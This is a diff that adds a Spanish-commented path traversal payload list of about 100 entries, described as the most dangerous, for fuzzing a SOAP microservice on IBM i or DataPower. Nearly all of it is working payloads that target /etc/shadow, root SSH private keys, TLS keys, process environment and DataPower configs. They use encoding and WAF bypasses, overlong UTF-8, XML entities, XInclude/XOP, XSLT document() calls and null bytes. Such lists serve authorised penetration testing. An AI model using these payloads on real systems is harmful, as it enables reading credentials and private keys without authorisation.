@@ -1042,3 +1042,146 @@ compress.zlib://../../../etc/passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 ../../../../../../../etc/shadow
 
+# =====================================================================
+# PATH TRAVERSAL / SOAP - TOP 100 MAS PELIGROSOS
+# Deducido de payloads_traversal_soap_1000.txt (el original queda intacto)
+# Entorno objetivo: microservicio SOAP tras AS400/IBM i o DataPower con
+# backend Oracle (runtime Unix-like -> separador de ruta validos: solo /)
+# Notas de entorno:
+#   - Payloads con \ literal (seccion Windows del original) EXCLUIDOS:
+#     \ no es separador de ruta en Unix/IBM i. Se conservan solo las
+#     sondas codificadas %5c/%255c (bypass de filtros que normalizan
+#     \ -> / tras decodificar).
+#   - Los payloads estructurales XML (xi:include, XOP, CDATA, PI,
+#     entidades) llevan < > crudos A PROPOSITO: el fuzzer debe
+#     insertarlos verbatim dentro del elemento, sin escapar ni
+#     envolver en CDATA adicional (a diferencia de la lista SQLi).
+#   - Excluido del original: ...passwd&#0; (referencia NUL = XML mal
+#     formado; provoca error de parseo, no traversal).
+# Uso: mismo patron que sqli-oracle-detect.txt con soap_fuzzer.py
+# =====================================================================
+
+# --- 1. Baseline de deteccion (responde distinto si existe/no existe) ---
+/etc/passwd
+/etc/hostname
+/etc/machine-id
+/etc/nonexistentfile123
+
+# --- 2. Relativos raw: profundidad creciente sobre targets de alto impacto ---
+../../etc/passwd
+../../etc/shadow
+../../root/.ssh/id_rsa
+../../proc/self/environ
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../root/.ssh/id_rsa
+../../../../proc/self/environ
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../root/.ssh/id_rsa
+../../../../../../proc/self/environ
+../../../../../../../../etc/passwd
+../../../../../../../../etc/shadow
+../../../../../../../../root/.ssh/id_rsa
+../../../../../../../../proc/self/environ
+../../../../../../../../../etc/passwd
+../../../../../../../../../etc/shadow
+../../../../etc/ssl/private/server.key
+../../../../etc/pki/tls/private/localhost.key
+../../../../etc/ipsec.secrets
+../../../../etc/sudoers
+
+# --- 3. Activos DataPower (config de arranque, logs, certs, WSDL) ---
+../../opt/datapower/config/auto-startup.cfg
+../../../../opt/datapower/config/auto-startup.cfg
+../../../../../../../../opt/datapower/config/auto-startup.cfg
+../../../../opt/ibm/datapower/etc/management.cfg
+../../../../opt/datapower/logstore/default/default.log
+../../../../opt/datapower/certstore/
+../../../../usr/local/dpbroker/etc/webgui/
+../../../../srv/soap/wsdl/service.wsdl
+
+# --- 4. Codificacion simple %2f / %2e%2e ---
+..%2fetc%2fpasswd
+..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%2f..%2froot%2f.ssh%2fid_rsa
+..%2f..%2f..%2f..%2f..%2froot%2f.ssh%2fid_rsa
+..%2f..%2f..%2f..%2f..%2fetc%2fshadow
+..%2f..%2f..%2f..%2f..%2fproc%2fself%2fenviron
+
+# --- 5. Doble codificacion (WAF decodifica una vez) ---
+..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# --- 6. Overlong UTF-8 (normalizacion Unicode defectuosa) ---
+..%c0%af..%c0%afetc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9cetc/passwd
+..%e0%80%af..%e0%80%afetc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+
+# --- 7. Sonidas backslash CODIFICADAS (bypass \ -> /; \ literal invalido) ---
+..%5c..%5cetc%5cpasswd
+..%5c..%5c..%5cetc%5cpasswd
+..%255c..%255cetc%255cpasswd
+..%255c..%255c..%255cetc%255cpasswd
+
+# --- 8. Evasion de filtros en claro ---
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+///../../../../../../etc/passwd
+.%2e/.%2e/etc/passwd
+%2e./%2e./etc/passwd
+..%2F..%2Fetc%2Fpasswd
+
+# --- 9. Entidades XML y CDATA (decodifica tras el parseo) ---
+&#46;&#46;&#47;&#46;&#46;&#47;etc&#47;passwd
+&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x2f;etc&#x2f;passwd
+&#46;&#46;%2f&#46;&#46;%2fetc%2fpasswd
+..&sol;..&sol;etc&sol;passwd
+&#46;&#46;&#47;&#46;&#46;&#47;etc&#47;shadow
+..&sol;..&sol;etc&sol;shadow
+<![CDATA[../../etc/passwd]]>
+<![CDATA[../..]]><![CDATA[/../etc/passwd]]>
+<![CDATA[../../etc/shadow]]>
+
+# --- 10. Estructurales SOAP/XML (los de mayor impacto en microservicio SOAP) ---
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/shadow"/>
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="../../../../etc/passwd"/>
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file://localhost/../../../etc/passwd"/>
+<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/>
+<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///../../../opt/datapower/drpc/config/auto-startup.cfg"/>
+document('file:///etc/passwd')
+document('file:///etc/shadow')
+document('../../../../../opt/datapower/config/auto-startup.cfg')
+document(concat('../../../../etc/','passwd'))
+dp:url-open('http://127.0.0.1:80/file:///etc/passwd')
+dp:open-file('../../../etc/passwd')
+xs:import schemaLocation='../../../../etc/passwd'
+xsd:include schemaLocation='file:///etc/hosts'
+xsl:import href='../../../../etc/passwd'
+xsl:include href='file:///etc/shadow'
+xml-stylesheet href='../../../../etc/passwd'
+<?xml-stylesheet type="text/xsl" href="../../../../etc/passwd"?>
+
+# --- 11. URIs file:// (parsers XML/XSLT con resolucion de esquemas) ---
+file:///etc/passwd
+file:///etc/shadow
+file:///opt/datapower/config/auto-startup.cfg
+file:///proc/self/environ
+file:///../../../etc/passwd
+
+# --- 12. Null byte / override de extension ---
+../../../../etc/passwd%00
+../../etc/passwd%2500
+../../../../etc/passwd%00.xml
+
